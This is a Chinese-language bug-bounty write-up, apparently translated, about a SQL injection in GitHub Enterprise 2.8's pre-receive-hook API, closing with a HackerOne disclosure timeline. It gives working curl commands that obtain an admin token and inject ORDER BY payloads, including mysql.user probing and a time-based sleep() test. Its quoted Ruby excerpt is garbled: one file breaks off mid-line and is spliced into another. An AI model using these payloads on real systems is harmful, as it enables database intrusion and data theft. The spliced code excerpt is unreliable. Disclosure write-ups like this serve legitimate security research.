    $ ./bin/rake about
        About your application's environment
        Ruby version              2.1.7 (x86_64-linux)
        RubyGems version          2.2.5
        Rack version              1.6.4
        Rails version             3.2.22.4
        JavaScript Runtime        Node.js (V8)
        Active Record version     3.2.22.4
        Action Pack version       3.2.22.4
        Action Mailer version     3.2.22.4
        Active Support version    3.2.22.4
        Middleware                GitHub::DefaultRoleMiddleware, Rack::Runtime, Rack::MethodOverride, ActionDispatch::RequestId, Rails::Rack::Logger, ActionDispatch::ShowExceptions, ActionDispatch::DebugExceptions, ActionDispatch::Callbacks, ActiveRecord::ConnectionAdapters::ConnectionManagement, ActionDispatch::Cookies, ActionDispatch::Session::CookieStore, ActionDispatch::Flash, ActionDispatch::ParamsParser, ActionDispatch::Head, Rack::ConditionalGet, Rack::ETag, ActionDispatch::BestStandardsSupport
        Application root          /data/github/9fcdcc8
        Environment               production
        Database adapter          githubmysql2
        Database schema version   20161003225024
大部分代码都是用Ruby编写的(Ruby on Rails and Sinatra)。
/data/github/看起来像是在80/tcp和443/tcp端口下运行的应用，并且可能是github.com,gist.github.com和api.github.com的代码库。
/data/render/看起来像是render.githubusercontent.com的代码库。
/data/enterprise-manage/应该是8443/tcp端口下对应的应用。
Github企业版使用enterprise和dotcom来检查应用是否运行于Enterprise Mode或者Github dot com mode？
**漏洞发现**
我花费了一周左右的时间来发现该漏洞，我对Ruby并不熟悉，但是可以在实践中学习不是吗！以下是我这一周的大概进度。
Day 1 – 安装配置VM
Day 2 – 安装配置VM
Day 3 – 通过代码审计学习Rails
Day 4 – 通过代码审计学习Rails
Day 5 – 通过代码审计学习Rails
Day 6 – 成功发现了SQL注入漏洞
SQL注入漏洞是在Github企业版中的PreReceiveHookTarget模块中发现的，具体位于/data/github/current/app/model/pre_receive_hook_target.rb的第45行：
        33   scope :sorted_by, -> (order, direction = nil) {    
        34     direction = "DESC" == "#{direction}".upcase ? "DESC" : "ASC"
        35     select( org = find_org!
        12     @documentation_url << "#list-pre-receive-hooks"
        13     targets = PreReceiveHookTarget.visible_for_hookable(org)
        14     targets = sort(targets).paginate(pagination)
        15     GitHub::PrefillAssociations.for_pre_receive_hook_targets targets
        16     deliver :pre_receive_org_target_hash, targets
        17   end
        ...
        60   def sort(scope)
        61     scope.sorted_by("hook.#{params[:sort] || "id"}", params[:direction] || "asc")
        62   end
可以看到params[:sort]作为参数被传入到scope.sorted_by中，因此，我们可以注入我们的恶意payload到params[:sort]。在触发该漏洞前，我们需要一个合法的access_token来访问API，幸运的是，我们可以通过以下命令来获取到：
     $ curl -k -u 'nogg:nogg' 'https://192.168.187.145/api/v3/authorizations'     
        -d '{"scopes":"admin:pre_receive_hook","note":"x"}'
        {
          "id": 4,
          "url": "https://192.168.187.145/api/v3/authorizations/4",
          "app": {
            "name": "x",
            "url": "https://developer.github.com/enterprise/2.8/v3/oauth_authorizations/",
            "client_id": "00000000000000000000"
          },
          "token": "????????",
          "hashed_token": "1135d1310cbe67ae931ff7ed8a09d7497d4cc008ac730f2f7f7856dc5d6b39f4",
          "token_last_eight": "1fadac36",
          "note": "x",
          "note_url": null,
          "created_at": "2017-01-05T22:17:32Z",
          "updated_at": "2017-01-05T22:17:32Z",
          "scopes": [
            "admin:pre_receive_hook"
          ],
          "fingerprint": null
        }
一旦获取到了access_token，我们就可以通过以下方式来触发漏洞了：
        $ curl -k -H 'Accept:application/vnd.github.eye-scream-preview'     
        'https://192.168.187.145/api/v3/organizations/1/pre-receive-hooks?access_token=????????&sort=id,(select+1+from+information_schema.tables+limit+1,1)'
        [
        ]
        $ curl -k -H 'Accept:application/vnd.github.eye-scream-preview' 
        'https://192.168.187.145/api/v3/organizations/1/pre-receive-hooks?access_token=????????&sort=id,(select+1+from+mysql.user+limit+1,1)'
        {
          "message": "Server Error",
          "documentation_url": "https://developer.github.com/enterprise/2.8/v3/orgs/pre_receive_hooks"
        }
        $ curl -k -H 'Accept:application/vnd.github.eye-scream-preview' 
        'https://192.168.187.145/api/v3/organizations/1/pre-receive-hooks?access_token=????????&sort=id,if(user()="github@localhost",sleep(5),user())
        {
            ...
        }
**时间线**
2016/12/26 05:48 通过HackerOne向Github报告
2016/12/26 08:39 Github确认漏洞并着手修复。
2016/12/26 15:48 提供更多的漏洞细节
2016/12/28 02:44 Github回复漏洞在下个版本得到修复
2017/01/04 06:41 Github奖励$5000 USD漏洞奖金
2017/01/05 02:37 询问如果要发表blog是否有需要注意的点
2017/01/05 03:06 Github表示同意发表blog
2017/01/05 07:06 Github企业版2.8.5发布